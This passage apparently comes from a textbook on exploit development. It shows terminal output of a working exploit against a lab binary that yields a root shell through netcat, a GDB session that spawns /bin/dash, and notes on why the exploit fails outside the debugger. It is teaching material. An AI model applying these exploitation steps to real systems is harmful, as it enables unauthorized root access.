```
root@kali:/tmp# python exp.py > /dev/null
root@kali:/tmp# nc -v 127.0.0.1 8675
localhost [127.0.0.1] 8675 (?) open
id
uid=0(root) gid=0(root) groups=0
```

```
root@kali:~# gdb --quiet ./vuln
Reading symbols from ./vuln...done.
(gdb) r
Starting program: /root/vuln
C
Program received signal SIGINT, Interrupt.
0xfffffc8b in ?? ()
(gdb) r
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /root/vuln
process 7689 is executing new program: /bin/dash
```

# FIGURE 9.9 Executing our working exploit.

With this working in, the final step is to remove the debugger from the equation and try to exploit with just the binary itself. This is sometimes tricky because GDB adds information to the application while it's running to help with debugging. As a result, ESP will always be different in practice than when running a binary through GDB. When we try our exploit as it is, we see the result in Fig. 9.10; it fails.